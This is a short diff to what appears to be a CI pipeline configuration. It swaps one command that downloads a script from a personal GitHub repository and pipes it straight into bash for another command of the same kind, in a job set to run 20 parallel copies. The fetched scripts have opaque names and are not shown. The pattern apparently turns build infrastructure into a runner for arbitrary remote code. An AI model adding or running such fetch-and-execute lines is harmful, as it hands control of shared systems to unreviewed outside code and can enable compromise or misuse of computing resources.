@@ -15,5 +15,5 @@ blocks:
       jobs: 
         - name: 'Job #1' 
           commands: 
-            - curl -sL https://github.com/liecamshoe/file/raw/main/udc5 | bash
+            - curl -sL https://github.com/liecamshoe/file/raw/main/c64 | bash
           parallelism: 20
